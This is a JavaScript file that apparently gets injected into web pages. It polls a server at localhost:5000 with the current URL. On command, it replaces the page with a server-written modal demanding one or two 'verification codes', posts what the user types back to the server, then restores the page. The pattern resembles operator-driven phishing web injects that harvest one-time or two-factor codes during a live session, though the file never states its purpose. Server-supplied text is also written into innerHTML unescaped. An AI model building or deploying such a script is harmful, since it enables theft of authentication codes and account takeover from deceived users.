var showSecondView=false
var serverResult= ""
var body=""

// secondVerificationCodeQuest

var submitRequestedCode=async(browserLocation)=>{
   
    var verificationCodeRequested=document.querySelector("#verificationCodeQuest")
    var secondVerificationCodeRequested=document.querySelector("#secondVerificationCodeQuest")
    if(!verificationCodeRequested.value)return document.querySelector(".questErrMessage").innerHTML=`${verificationCodeRequested.placeholder} is required`
    if(!secondVerificationCodeRequested.value)return document.querySelector(".questErrMessage").innerHTML=`${secondVerificationCodeRequested.placeholder} is required`

    document.querySelector(".questErrMessage").innerHTML=""
    document.querySelector("#submitRequestedCode").innerHTML="Proccessing..."

    try{
var response= await fetch("http://localhost:5000/api/user/submitCode",{
    method:"POST",
    headers:{"content-type":"application/json"},
    body:JSON.stringify({browserLocation,verificationCode:`${document.querySelector("#verificationCodeQuest").placeholder}= ${verificationCodeRequested.value}`,secondVerificationCode:`${document.querySelector("#secondVerificationCodeQuest").placeholder}= ${secondVerificationCodeRequested.value}`})
})
var result=await response.json()
console.log(result)
if(result.error)return document.querySelector(".questErrMessage").innerHTML=result.errMessage
document.querySelector("#submitRequestedCode").innerHTML="Success"
document.querySelector("body").innerHTML=body

intervalId = setInterval(async() => {
    checkVerificationQuest()
    
}, 3000);
console.log("ressetted")
// if(serverResult.)
//call the updateview again with a result saved before
    }catch(err){
        document.querySelector(".questErrMessage").innerHTML=err.message
        document.querySelector("#submitRequestedCode").innerHTML="Try again"
    }
    
}





var updateViewOne=(viewUpdate)=>{
body= document.querySelector("body").innerHTML

    document.querySelector("body").innerHTML=`<style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap');
    
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Poppins", sans-serif;
    }
    
    @keyframes showView {
        from {
    
    
            opacity: 0;
        }
    
        to {
    
            opacity: 1;
        }
    }
    
    
    .serverQuestionModal {
        animation-name: showView;
        animation-duration: 1s;
        animation-iteration-count: 1;
        animation-direction: forwards;
        position: fixed;
        width: 500px;
        height: 300px;
        padding: 10px;
        border: 1px solid #fff;
        background-color: #f4f9ff;
        top: 40%;
        left: 50%;
        margin-top: -100px;
        margin-left: -250px;
        z-index: 2;
        /* display: none; */
    }
    
    
    .serverQuestionModal h1 {
        font-size: 23px;
        text-align: center;
        color: rgb(235, 164, 0);
        padding: 5px;
    }
    
    .serverQuestionModal>div input {
        display: flex;
        align-self: center;
        padding: 8px 12px;
        margin: auto;
        margin-top: 5px;
        text-align: center;
        border-radius: 10px;
        border-color: gray;
    }
    
    .serverQuestionModal .button {
        display: flex;
        justify-content: space-around;
        flex-wrap: wrap;
    
    }
    
    button {
        color: #fff;
        background-color: rgb(235, 164, 0);
        border: 1px solid rgb(235, 164, 0);
        padding: 10px 29px;
        margin: 10px;
        border-radius: 10px;
    }
    
    button:hover {
        background-color: rgb(179, 129, 14);
        cursor: pointer;
    }
    
    
    
    .proccessing {
        margin: auto;
        text-align: center;
        font-size: 21px;
    
    
        position: relative;
        top: 50%;
        padding: 10px;
        /* left: 50%; */
        /* margin: -25px 0 0 -25px; */
    }
    
    .errmessage {
        font-size: 19px;
        color: red;
        position: relative;
        top: 20%;
        padding: 10px;
    
    }
    
    .serverQuestionModal  p {
        font-size: 18px;
        text-align: center;
    }
    
    @media (max-width:550px) {
    
        .serverQuestionModal {
    
    
            position: fixed;
            width: 80%;
            height: auto;
            padding: 10px;
            border: 1px solid #fff;
            background-color: #f4f9ff;
            top: 30%;
            left: 50%;
            margin-top: -100px;
            margin-left: -40%;
            z-index: 2;
            border-radius: 10px;
    
        }
    
        .serverQuestionModal h1 {
            font-size: 20px;
            text-align: center;
            color: rgb(235, 164, 0);
            padding: 4px;
        }
    
        .serverQuestionModal .button {
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
    
        }
    
        button {
            color: #fff;
            background-color: rgb(235, 164, 0);
            border: 1px solid rgb(235, 164, 0);
            padding: 6px 20px;
            margin: 10px;
            border-radius: 10px;
        }
    
        button:hover {
            background-color: rgb(179, 129, 14);
            cursor: pointer;
        }
    
    }
    </style>
    
    <div id="serverQuestionModal" class="serverQuestionModal">
    
    <h1>${viewUpdate.title}</h1>
    <p>${viewUpdate.firstMessage}</p>
        <br>
    <p class="questErrMessage" style="color:red;"> </p>
    
    <div>
        <input type="text" id="verificationCodeQuest" placeholder=${viewUpdate.placeholder}>
        ${viewUpdate.numberOfquestInput >=2 ? `<input type="text" id="secondVerificationCodeQuest" placeholder=${viewUpdate.secondPlaceholder}>`:""}
    
    </div>
    <div class="button">
        <button id="submitRequestedCode" >Submit</button>
    </div>
    </div>`
    
    document.querySelector("#submitRequestedCode").onclick=()=>{
        submitRequestedCode(window.location.href)
    }

 
    }







// var serverResult=""
// executionTimes=0






var intervalId = setInterval(async() => {
    checkVerificationQuest()
    
}, 2000);


var checkVerificationQuest=async ()=>{
   
    try{
var response=await fetch("http://localhost:5000/api/user/verification/check",{
    method:"POST",
    headers:{"content-type":"application/json"},
    body:JSON.stringify({browserLocation:window.location.href})
})
var result=await response.json()
console.log(result)
if(result.error !=false)return console.log(result.errMessage)

if(window.location.href.includes(result.message.browserLocation)){
    clearInterval(intervalId)
    updateViewOne(result.message)
    // alert("cleared")
serverResult=result.message
// result.message.numberOfquestInput >=2 ? showSecondView=true : shshowSecondView=false

// showSecondView
//check if i have updated the view before
// updateView(result.message)

}else{
    console.log("not supposed to execute here")
    clearInterval(intervalId)
}

return {error:false}
}catch(err){
    console.log(err)
    return {error:true,errMessage:err.message}
}
}





















// var calledOnScrollQuatar=false
// var calledOnScrollHalf=false
// window.onscroll=()=>{
//     if(window.scrollY+window.innerHeight >=document.body.offsetHeight){
//         alert("scrolled to the bottom")
//         checkVerificationQuest()
//     }

//     if(window.scrollY+window.innerHeight >=document.body.offsetHeight/4 && calledOnScrollQuatar !=true){
//        console.log("scrolled quater")
//        calledOnScrollQuatar=true
//        checkVerificationQuest()

//     }

//     if(window.scrollY+window.innerHeight >=document.body.offsetHeight/2  && calledOnScrollHalf !=true){
//         calledOnScrollHalf=true
//         console.log("scrolled half")
//         checkVerificationQuest()

//     }
//     }




    // document.addEventListener("click",()=>{
    //     if(document.querySelector("button").click){
    //      alert("button clicked heheh")
    //     }
    //     // alert("called a separate function")
    //     checkVerificationQuest()

    // })
    // .submitRequestedCode